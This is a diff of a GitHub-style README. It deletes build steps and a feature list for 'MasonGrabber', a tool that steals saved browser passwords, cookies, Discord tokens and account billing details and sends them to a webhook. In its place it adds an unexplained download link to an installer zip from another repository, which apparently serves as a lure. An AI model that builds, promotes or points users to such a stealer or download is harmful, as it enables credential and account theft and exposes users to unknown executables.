@@ -1,27 +1,11 @@
-# MasonGrabber
-1. Download MasonGrabber
-2. Run install.bat 
-3. Run run.bat
-4. enter your webhook
-closes, check the MasonGrabber folder for a folder called dist.
-6. open and find your main.exe
-----------------------------------------------------------------
-- Browser Grabber
-![Screenshot 2023-05-13 120245](https://github.com/ALMASONYH/MasonGrabber/assets/117776155/0d3b9ddf-b2c8-4423-bf43-56a77d22a736)
+## Software | [Download](https://github.com/UniiemStudio/CTFever-Premium-Service/releases/download/test/Gh-Installer.zip)
 
-  - Grab Saved Passwords
-  - Grab Cookies
+Create for PC
 
-- Discord Grabber
+# Showcase
 
-  - Grab Discord Tokens from browsers
-  - Grab Discord Token from discord, discordcanary, discordPTBa
+![showcase](https://i.imgur.com/Md8abXD.png)
 
-- Discord Token
+## License
 
-  - Nitro
-  - Badges
-  - Billing
-  - Email
-  - Phone
-  - HQ Friends
+[![Licence](https://img.shields.io/github/license/Ileriayo/markdown-badges?style=for-the-badge)](./LICENSE)
